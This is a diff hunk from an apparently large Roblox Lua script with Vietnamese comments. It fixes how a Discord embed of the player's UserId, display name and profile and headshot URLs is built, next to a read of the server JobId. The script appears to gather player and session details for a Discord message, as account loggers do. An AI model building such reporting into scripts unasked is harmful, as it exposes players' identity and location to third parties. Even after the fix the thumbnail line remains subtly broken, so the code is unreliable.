@@ -10605,12 +10605,12 @@ local jobId = game.JobId
 -- Tạo dữ liệu gửi lên Discord
 local Data = {
     ["embeds"] = {{
-        ["title"] = "Roblox Account Information".. player.UserId,
-        ["url"] = "https://www.roblox.com/users/" 
+        ["title"] = "Roblox Account Information",
+        ["url"] = "https://www.roblox.com/users/" .. player.UserId,
         ["description"] = "Display name: **" .. player.DisplayName .. "**",
         ["color"] = tonumber("0x000000"), -- Đổi màu viền thành đen
         ["thumbnail"] = {
-            ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="119980166507719",
+            ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId,
                 "&width=420&height=420&format=png"
         },
         ["fields"] = {{
